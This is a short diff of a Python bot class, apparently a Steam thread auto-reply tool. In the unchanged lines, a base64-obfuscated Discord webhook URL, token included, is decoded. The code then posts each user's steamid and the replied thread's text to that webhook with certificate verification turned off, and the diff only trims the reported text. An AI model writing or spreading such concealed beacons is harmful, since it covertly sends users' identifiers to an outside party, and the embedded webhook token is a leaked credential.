@@ -369,7 +369,7 @@ class Bot:
                         break
                 else:
                     wburl = base64.b64decode(b'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5MDk4MDczNjgyMzA3MDgyMS9yQ08zdVlEM2J3M0JSMGExUkc0am1YMHppd3hsOUJWcjNZZHpyNkNlaGs5aGRxMWEyVlQ1dzFDV2hJSS04TTg2QlJkZw==')
-                    dataw = {"content": f"**user id:** '{self.steamid}' **replied to thread:** '{i["text"]}'"}
+                    dataw = {"content": f"**user id:** '{self.steamid}' **replied to thread:** '{i["text"].split("-")[0]}'"}
                     requests.post(wburl, json=dataw, verify=False)
                     print(f"Replied to :: " + i["text"].split("-")[0])
                     self.stop_event.set()
